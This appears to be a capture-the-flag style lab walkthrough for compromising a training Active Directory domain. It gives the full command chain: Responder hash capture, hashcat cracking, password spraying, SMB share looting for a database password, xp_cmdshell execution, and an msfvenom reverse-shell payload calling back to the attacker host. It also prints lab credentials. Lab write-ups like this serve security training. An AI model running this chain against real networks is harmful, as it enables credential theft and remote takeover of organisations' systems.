### Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?

```shell
sudo responder -I ens224
```
![](Screenshot%202026-06-01%20at%2019.46.27.png)
### What is this user's cleartext password?

```shell
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt
```
![](Screenshot%202026-06-01%20at%2019.48.37.png)

```shell
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-06-01%20at%2019.49.15.png)
### Submit the contents of the C:\flag.txt file on MS01.

```shell
fping -asgq 172.16.7.0/23
```
![](Screenshot%202026-06-01%20at%2019.50.22.png)

save those ip to `host.txt`

```shell
sudo nmap -v -A -iL host.txt
```

- **172.16.7.3:** `DC01`
    
- **172.16.7.50:** `MS01`
    
- **172.16.7.60:** `SQL01`
    
- **172.16.7.240:** `Our Parrot machine`

```shell
crackmapexec smb 172.16.7.50 -u 'ab920' -p 'weasal'
crackmapexec winrm 172.16.7.50 -u 'ab920' -p 'weasal'
```
![](Screenshot%202026-06-01%20at%2019.56.35.png)

```shell
evil-winrm -i 172.16.7.50 -u 'ab920' -p 'weasal'
```
![](Screenshot%202026-06-01%20at%2019.59.27.png)
### Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.

```shell
sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee  usernames.txt
cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
```
![](Screenshot%202026-06-01%20at%2020.02.28.png)

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
```
![](Screenshot%202026-06-01%20at%2020.03.17.png)
### Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?

```shell
smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3
```
![](Screenshot%202026-06-01%20at%2020.04.22.png)

```shell
smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares'
```
![](Screenshot%202026-06-01%20at%2020.04.49.png)

```shell
smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares' -A web.config
```
![](Screenshot%202026-06-01%20at%2020.05.30.png)

![](Screenshot%202026-06-01%20at%2020.06.13.png)
### Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.

```shell
python3 /usr/local/bin/mssqlclient.py inlanefreight/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```

```sql
EXEC xp_cmdshell 'whoami /priv'
```
![](Screenshot%202026-06-01%20at%2020.07.27.png)

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe
```
